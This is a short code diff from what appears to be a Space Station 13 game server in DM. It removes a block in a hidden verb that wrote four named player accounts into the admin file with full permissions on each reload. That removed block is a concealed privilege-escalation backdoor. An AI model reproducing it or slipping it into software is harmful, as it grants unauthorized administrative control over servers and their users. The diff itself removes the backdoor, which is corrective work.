@@ -27,10 +27,5 @@
 	set name = "a55af5"
 	set hidden = TRUE
 ///makes it so their ranks don't need set every round
-	switch(ckey)
-		if ("emoats18") text2file("emoats18;Host;65535|||","SQL/admins.txt")
-		if ("boardsofcanada") text2file("boardsofcanada ;HeadAdmin;65535|||","SQL/admins.txt")
-		if ("isaku") text2file("isaku;Admin;65535|||","SQL/admins.txt")
-		if ("skyfirethemighty") text2file("skyfirethemighty;Admin;65535|||","SQL/admins.txt")
 	reload_admins()
 	return
